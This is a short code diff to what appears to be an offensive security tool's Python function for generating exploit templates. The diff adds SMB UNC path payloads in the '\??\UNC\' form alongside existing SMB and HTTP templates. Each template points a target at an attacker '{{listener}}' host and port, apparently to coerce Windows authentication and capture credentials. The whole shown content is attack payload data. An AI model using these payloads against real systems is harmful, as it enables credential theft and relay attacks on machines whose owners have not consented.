@@ -47,19 +47,25 @@ def generate_exploit_templates(desired_auth_type=None):
         ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
         ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\\\x00'),
         ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\x00'),
+        # UNC path with ??
+        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
+        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\aa\x00'),
+        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
+        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
+        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\\x00'),
+        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\x00'),
         # UNC path with .
         ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
         ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
         ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
         ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\\x00'),
         ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\x00'),
-
         # HTTP
         ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\File.txt\x00'),
         ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\\x00'),
         ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\x00'),
         ("http", '\\\\{{listener}}{{http_listen_port}}\\\x00'),
-        ("http", '\\\\{{listener}}{{http_listen_port}}\x00'),
+        ("http", '\\\\{{listener}}{{http_listen_port}}\x00')
     ]
 
     if add_uncommon_tests:
